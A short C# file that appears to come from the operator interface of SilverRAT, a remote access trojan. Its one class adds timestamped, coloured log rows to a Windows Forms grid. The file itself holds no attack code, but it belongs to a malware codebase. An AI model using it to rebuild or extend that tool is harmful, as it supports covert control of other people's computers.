using System;
using System.Drawing;
using System.Windows.Forms;

namespace SilverRAT.Handle_Packet;

public class HandleLogs
{
    public void Addmsg(string Msg, Color color, int IndxIcon)
    {
        try
        {
            DataGridViewRow item = new DataGridViewRow
            {
                Height = 24
            };
            item.Cells.Add(new DataGridViewImageCell
            {
                Value = Program.Silver.IconLogs.Images[IndxIcon],
                ImageLayout = DataGridViewImageCellLayout.Zoom
            });
            item.Cells.Add(new DataGridViewTextBoxCell
            {
                Value = DateTime.Now.ToLongTimeString()
            });
            item.Cells.Add(new DataGridViewTextBoxCell
            {
                Value = Msg
            });
            DataGridViewCell dataGridViewCell = item.Cells[2];
            dataGridViewCell.Style.ForeColor = color;
            if (Program.Silver.InvokeRequired)
            {
                Program.Silver.Invoke((MethodInvoker)delegate
                {
                    lock (Settings.LockListviewLogs)
                    {
                        Program.Silver.LogsList.Rows.Insert(0, item);
                    }
                });
                return;
            }
            lock (Settings.LockListviewLogs)
            {
                Program.Silver.LogsList.Rows.Insert(0, item);
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.ToString());
        }
    }
}
